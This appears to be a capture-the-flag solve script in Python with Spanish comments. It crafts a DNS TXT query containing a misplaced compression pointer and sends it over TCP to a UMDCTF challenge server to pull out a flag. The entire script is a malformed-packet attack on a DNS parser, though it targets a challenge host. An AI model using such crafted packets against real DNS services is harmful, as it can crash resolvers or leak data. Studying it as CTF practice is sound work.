import socket
header = (
        b'\x12\x34'         # ID aleatorio
        b'\x01\x00'      # Flags (RD=1)
        b'\x00\x01'      # QCOUNT
        b'\x00\x00'      # ANCOUNT
        b'\x00\x00'      # NSCOUNT
        b'\x00\x00'      # ARCOUNT
        )
q = (
           b"\x06tiktok"
           b"\xC0\x19"
           b"\x00\x10"      # tipo TXT
           b"\x00\x01"      # clase IN
           b"\x03com\x00"
     )
wire = header + q

# Enviar consulta al servicio
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('challs.umdctf.io',32301))
    s.send(len(wire).to_bytes(4) + wire)
    response = s.recv(1024)

# Extraer la flag de la respuesta DNS
print("Request:", wire)
print("Response:",response.decode())
